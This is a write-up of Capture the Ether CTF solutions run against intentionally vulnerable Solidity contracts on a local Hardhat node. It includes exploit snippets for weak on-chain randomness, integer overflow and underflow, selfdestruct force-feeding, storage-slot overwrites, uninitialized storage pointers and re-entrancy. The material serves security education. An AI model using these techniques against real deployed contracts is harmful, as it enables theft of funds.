# [Capture The Ether](https://capturetheether.com/challenges/)

---

#### Capture the Ether using Hardat
These challenges were originally deployed to the Ropsten testnet which is now deprecated
However, the challenges can be completed using something like the Remix IDE
Or we can use devlopment environments like Hardhat or Foundry
This repo uses Hardhat v2.17.2.
It has the contracts, deploy scripts, and tests needed to complete the challenges
Add the old compiler version to ``hardhat.config.ts``
```js
import { HardhatUserConfig } from "hardhat/config";
import "@nomicfoundation/hardhat-toolbox";

const config: HardhatUserConfig = {
  solidity: {
    compilers: [
      {
        version: "0.4.21",
      },
      {
        version: "0.8.19",
      },
    ],
  },
  mocha: {
    timeout: 1000000,
  },
};

export default config;
```

#### Local Hardhat node
The challenges were completed using a local node
```
npx hardhat node
```
tests and scripts were run with the command:
```
npx hardhat test <test file>
```
```
npx hardhat run <script file>
```

#### Warmup
##### [Deploy A Contract](https://capturetheether.com/challenges/warmup/deploy/)
Deploy the contract and call the ``isComplete()`` function
[Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/warmup/deployChallenge.ts)

##### [Call Me](https://capturetheether.com/challenges/warmup/call-me/)
Deploy the contract and call the ``callMe()`` function
[Script]

##### [Choose a nickname](https://capturetheether.com/challenges/warmup/nickname/)
Before setting a nickname, it needs to be encoded
```js
let name = ethers.encodeBytes32String("Robin");
```
Accessing the nickname from the mapping and comparing it the name variable should return true
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/warmup/captureTheEther.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/warmup/captureTheEther.ts)


#### Lotteries
##### [Guess the Number](https://capturetheether.com/challenges/lotteries/guess-the-number/)
The number is stored as a variable so we can use it as an argument in the ``guess()`` function
```js
const tx = await contract.guess(42, {
    value: ethers.parseEther("1"),
});
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheNumber.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheNumberChallenge.ts)

##### [Guess the Secret Number](https://capturetheether.com/challenges/lotteries/guess-the-secret-number/)
To solve this challenge, we use the ``uint8`` parameter of ``guess()`` as a hint. ``uint8`` is an unsigned integer with 8 bits. It can hold a maximum value of 255, so we know the answer is between 0 and 255.
We can use a forloop to find the answer
```js
const answerHash =
    "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";
let secretNumber;
for (let i = 0; i <= 255; i++) {
    const numberBytes = ethers.toBeHex(i);
    const hash = ethers.keccak256(numberBytes);
    if (answerHash === hash) {
    secretNumber = i;
    console.log(`The secret number is ${secretNumber}`);
    break;
    }
}
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheSecretNumber.ts) &nbsp;
[Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheSecretNumber.ts)

##### [Guess the Random Number](https://capturetheether.com/challenges/lotteries/guess-the-random-number/)
In this challenge, the constructor calculates the answer using the blocknumber and timestamp. But the answer is stored as a state variable. We can [access storage variables starting from position 0](https://docs.soliditylang.org/en/v0.6.6/miscellaneous.html#layout-of-state-variables-in-storage)
```js
const answer = await ethers.provider.getStorage(contract.target, 0);
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheRandomNumber.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheRandomNumber.ts)

##### [Guess the New Number](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)
To solve this challenge, a second contract can be created that interfaces with the first contract
```js
interface IGuessTheNewNumberChallenge {
    function guess(uint8) external payable;

    function isComplete() external view returns (bool);
}
```
The newer compiler versions don't have the ability to directly convert from ``bytes32`` to ``uint8`` like this
```js
function guess(uint8 n) public payable {
    require(msg.value == 1 ether);
    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

    if (n == answer) {
        msg.sender.transfer(2 ether);
    }
}
```
The second contract will contain a function that replicates the original ``guess`` function requiring a few extra steps to get to a ``uint8``
```js
function solve() external payable {
    require(address(this).balance >= 1 ether, "");

    bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
    uint256 number = uint256(hash);
    uint8 answer = uint8(number);

    challengeContract.guess{value:1 ether}(answer);

    require(challengeContract.isComplete(), "");

    payable(msg.sender).transfer(address(this).balance);
}
```
This allows the second contract to create a "random" number using the same blocknumber and timestamp that will be used in the original contract when the second contract makes a call to the first
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/guessTheSecretNumber.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/guessTheSecretNumber.ts)

##### [Predict the Future](https://capturetheether.com/challenges/lotteries/predict-the-future/)
As with the last challenge, this challenge will use a second contract that interfaces with the first contract. However, in this challenge, a guess has to be locked in before the contract logic creates a "random" number. The guess will be between 0 and 9
```js
bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
uint256 number = uint256(hash);
uint8 answer = uint8(number % 10);
```
The second contract will call the ``lockInguess`` function from the first contract with ``0`` as the guess. The logic from the second contract will require that the answer is ``0`` before the ``settle`` function from the first contract is called
```js
function solve() external payable {
    bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
    uint256 number = uint256(hash);
    uint8 answer = uint8(number % 10);

    require(answer == 0);

    challengeContract.settle();
    payable(msg.sender).transfer(address(this).balance);
}
```
Only one ether will be used. A while loop can be used to keep calling the ``solve`` function from the second contract until the answer is ``0``
```js
while (!(await contract.isComplete())) {
    try {
    const solve = await contract2.solve({ gasLimit: 1000000 });
    await solve.wait();
    } catch (err) {
    console.log(`attack failed`);
    }
    const blockNumber = await ethers.provider.getBlockNumber();
    console.log(`block number: ${blockNumber}`);
}
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/predictTheFuture.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/predeictTheFutureChallenge.ts)

##### [Predict the Blockhash](https://capturetheether.com/challenges/lotteries/predict-the-block-hash/)
This challenge uses the blocknumber to create a hash that is used as a comparison to the hash that is guessed. [blocknumber](https://docs.soliditylang.org/en/v0.8.21/units-and-global-variables.html#block-and-transaction-properties) only includes the 256 most recent blocks. Anything outside of this range returns 0.
We can use a forloop to mine blocks after we input our guess of "0x0000000000000000000000000000000000000000000000000000000000000000"
```js
for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_mine");
      console.log("block mined");
    }
```
At this point, the ``settle`` function is called, but the block for our guess is from 256 blocks ago. This ensures that the hash is going to match our guess.
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/lotteries/predictTheBlockHash.ts) &nsbp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/lotteries/predictTheBlockHashChallenge.ts)

#### Math
##### [Token Sale](https://capturetheether.com/challenges/math/token-sale/)
The goal of this challenge is to extract ether so the remaining balance is less than one. When the contract is deployed, it will be deployed with 1 ether. This challenge involves taking advantage of the fact that older compiler versions don't check for overflow/underflow. We can cause an overflow taking advantage of
```js
uint256 constant PRICE_PER_TOKEN = 1 ether;
...
require(msg.value == numTokens * PRICE_PER_TOKEN);
```
We can cause on overflow with the following logic, buying a large amount of tokens with less that one ETH and selling a token for one ETH
```js
const numNumerator = BigInt(2) ** BigInt(256);
const numDenominator = BigInt(10) ** BigInt(18);
const numResult = numNumerator / numDenominator + BigInt(1); // 115792089237316195423570985008687907853269984665640564039458

const ethNumerator = BigInt(2) ** BigInt(256);
const ethDenominator = BigInt(10) ** BigInt(18);
const ethResult =
    (ethNumerator / ethDenominator + BigInt(1)) * ethDenominator -
    ethNumerator; // 415992086870360064
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/math/tokenSale.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/math/tokenSaleChallenge.ts)

##### [Token Whale](https://capturetheether.com/challenges/math/token-whale/)
Like the previous challenge, we take advantage of an older compiler version by exploiting overflow/underflow. In this case, we use underflow to acheive to goal of underflow to create a large token amount. The ``transferFrom`` and ``_transfer`` function will be exploited
```js
function _transfer(address to, uint256 value) internal {
  balanceOf[msg.sender] -= value;
  balanceOf[to] += value;

  emit Transfer(msg.sender, to, value);
}

function transferFrom(address from, address to, uint256 value) public {
  require(balanceOf[from] >= value);
  require(balanceOf[to] + value >= balanceOf[to]);
  require(allowance[from][msg.sender] >= value);

  allowance[from][msg.sender] -= value;
  _transfer(to, value);
}
```
In our hardhat script, we use two accounts to achieve our goal
```js
const accounts = await ethers.getSigners();
const [player, friend] = accounts.slice(0, 2);
```
Deploying the contract will net the player with 1000 tokens. The friend account will approve a transfer of 1000 tokens to the player account. The player account will send 501 tokens to the friend account. Then the player account will ``transferFrom`` the friend account an amount of 500. Because the player account is the ``msg.sender``, the transfer account will subtract 500 from the player account. But because the player sent 501 tokens to the friend account, this will cause an underflow.
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/math/tokenWhale.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/math/tokenWhaleChallenge.ts)

##### [Retirement Fund](https://capturetheether.com/challenges/math/retirement-fund/)
This challenge requires that the balance of the contract in order to achieve completion. Only the owner can call the ``withdraw()`` function, but the ``collectPenalty()`` function has a line that can be exploited
```js
function collectPenalty() public {
    require(msg.sender == beneficiary);

    uint256 withdrawn = startBalance - address(this).balance;

    // an early withdrawal occurred
    require(withdrawn > 0);

    // penalty is what's left
    msg.sender.transfer(address(this).balance);
}
```
The ``withdrawn`` variable can be exploited with an underflow. In order to cause the underflow, we would need to send ether to this contract so ``startBalance - address(this).balance`` would be negative, causing the underflow. The underflow would meet the ``require(withdrawn > 0)`` conditions. Because this contract doesn't have a recieve or fallback function, we have to use the [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) opcode.  This can be done using a second contract that recieves a small amount of ether when it is deployed. When that contract is destroyed, it will send the small amount of ether to the target contract.
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

contract RetirementFundSolver {
    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/math/retirementFund.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/math/retirementFundChallenge.ts)

##### [Mapping](https://capturetheether.com/challenges/math/mapping/)
This challenge exploits the layout of state variables in storage. As there is no function to change ``isComplete`` to true, we have to manipulate storage to make the change. By exploiting the max storage slot of a dymanic array, we can cause an overflow allowing us to change value of ``isComplete``.
```js
// max uint to overflow array
const MAX_UINT_256 = BigInt("2") ** BigInt("256") - BigInt("1");

// max capacity array
const tx = await contract.set(MAX_UINT_256 - BigInt("1"), 0);
await tx.wait();
```
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/math/mapping.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/math/mappingChallenge.ts)

##### [Donation](https://capturetheether.com/challenges/math/donation/)
Our goal is to become the owner of this contract. This challenge also takes advantage of storage slots in order to exploit the contract. In the ``donation()`` function declares ``Donation`` but it does not specifiy location.
```js
function donate(uint256 etherAmount) public payable {
    // amount is in ether, but msg.value is in wei
    uint256 scale = 10**18 * 1 ether;
    require(msg.value == etherAmount / scale);

    Donation donation;
    donation.timestamp = now;
    donation.etherAmount = etherAmount;

    donations.push(donation);
}
```
The line ``Donation donation`` should specify the location. But because it doesn't, interacting with this function will manipulate the state variables. The ``donations`` array of structs would take up the first slot and the ``owner``variable takes the second.
```js
Donation[] public donations;
address public owner;
```
When this function is called, the first slot will be assigned ``donation.timestamp`` and the second slot will be assigned ``donation.etherAmount``. As the second slot is the ``owner`` variable, the solution to this challegene is passing an address as an argument for the ``donate()`` function.
There is also the require statement to consider:
```js
uint256 scale = 10**18 * 1 ether;
require(msg.value == etherAmount / scale);
```
Since ``1 ether`` in Solidity is the equivalent of ``10**18``, scale is actually ``10**36``. So dividing ``etherAmount`` by ``scale`` means the transaction amount needs to be ``1 wei``.

[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/math/donation.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/math/donationChallenge.ts)

##### [Fifty Years](https://capturetheether.com/challenges/math/fifty-years/)
Like Donation, this challenge will exploit an uninitialized storage pointer. In the ``upsert`` function, the ``storage`` keyword is used in the ``if`` block, but it's left out in the ``else`` block.
```js
function upsert(uint256 index, uint256 timestamp) public payable {
    require(msg.sender == owner);

    if (index >= head && index < queue.length) {
        // Update existing contribution amount without updating timestamp.
        Contribution storage contribution = queue[index];
        contribution.amount += msg.value;
    } else {
        // Append a new contribution. Require that each contribution unlock
        // at least 1 day after the previous one.
        require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

        contribution.amount = msg.value;
        contribution.unlockTimestamp = timestamp;
        queue.push(contribution);
    }
}
```
This means that in the else block, ``contribution.amount`` and ``contribution.unlockTimestamp`` will actually target the ``slot(0)`` and ``slot(1)`` in storage. With the ``upsert`` function, we will be able to manipulate ``Contribution[] queue;`` and ``uint256 head;`` as they are in ``slot(0)`` and ``slot(1)`` respectively.
In this process, we end up sending 2 wei to the contract, so the withdraw function will revert unless the contract recieves 2 wei. We solve this problem by using the ``selfdestruct`` method with a separate contract.
```js
contract FiftyYearsSolver {
    constructor(address payable target) payable {
        require(msg.value>0);
        selfdestruct(target);
    }
}
```

[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/math/fiftyYears.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/math/fiftyYearsChallenge.ts)


#### Accounts
##### [Fuzzy Identity](https://capturetheether.com/challenges/accounts/fuzzy-identity/)
The goal for this challenge is to be able to call the ``authenticate`` function
```js
function authenticate() public {
    require(isSmarx(msg.sender));
    require(isBadCode(msg.sender));

    isComplete = true;
}
```
Passing the first require statement involves creating a second contract that will return bytes32 "smarx". Passing the second require statement involves using a brute force method of finding a privatekey that generates a wallet address that includes "badcode"
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/accounts/fuzzyIdentity.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/accounts/fuzzyIdentityChallenge.ts)

##### [Public Key](https://capturetheether.com/challenges/accounts/public-key/)
Completing this challenge requires accessing transaction data from the provided address in the smart contract. The transaction data is on the deprecated Ropsten testnet.

##### [Account Takeover](https://capturetheether.com/challenges/accounts/account-takeover/)
Completing this challenge requires accessing transaction data from the provided address in the smart contract. The transaction data is on the deprecated Ropsten testnet.

#### Miscellaneous
##### [Assume Ownership](https://capturetheether.com/challenges/miscellaneous/assume-ownership/)
Since Solidity 0.5, constructors have to be defined with the constructor keyword. In this older version, a constructor is defined by using the contract name as a function. However, in this challenge the constructor is misspelled and the function is public. All that needs to be done is to call the misspelled function and authenticate.
[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/miscellaneous/ownership.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/miscellaneous/assumeOwnershipChallenge.ts)

##### [Token Bank](https://capturetheether.com/challenges/miscellaneous/token-bank/)
This challenge involves utilizing a re-entrancy attack. The withdraw function updates the balance after the transfer call which allows the re-entrancy:
```js
function withdraw(uint256 amount) public {
    require(balanceOf[msg.sender] >= amount);

    require(token.transfer(msg.sender, amount));
    balanceOf[msg.sender] -= amount;
}
```
Using a second contract can exploit this recursively until the challenge is completed.

[Test](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/test/miscellaneous/ownership.ts) &nbsp; [Script](https://github.com/robinpunn/blockchain-education/blob/main/capture-the-ether/scripts/miscellaneous/assumeOwnershipChallenge.ts)

#### Resources
[cmichel](https://cmichel.io/capture-the-ether-solutions/)<br>
[tomas](https://medium.com/@tomasfrancisco)<br>
[0xJauancito](https://github.com/0xJuancito/capture-the-ether-solutions)<br>
[kyrers](https://mirror.xyz/kyrers.eth/dSjaARoTkYitJyQA8CFKLrS5CXbRVf-K4ol8Nla-bj0)
